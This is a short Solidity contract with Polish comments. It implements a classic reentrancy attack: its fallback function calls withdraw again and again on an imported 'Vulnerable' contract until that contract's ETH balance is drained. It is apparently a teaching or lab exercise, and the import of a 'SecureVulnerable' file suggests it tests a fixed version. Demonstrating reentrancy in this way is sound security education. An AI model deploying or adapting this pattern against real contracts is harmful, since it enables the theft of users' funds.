// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SecureVulnerable.sol";

contract Attack {
    Vulnerable public vulnerableContract;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = Vulnerable(_vulnerableContractAddress);  // Przypisanie adresu Vulnerable
    }

    // Fallback wywołuje ponownie withdraw w Vulnerable
    fallback() external payable {
        if (address(vulnerableContract).balance >= AMOUNT) {
            vulnerableContract.withdraw(AMOUNT);
        }
    }

    // Funkcja inicjująca atak
    function attack() external payable {
        require(msg.value >= AMOUNT, "Must send ETH to initiate attack");
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw(AMOUNT);
    }

    // Zwraca saldo kontraktu Attack
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
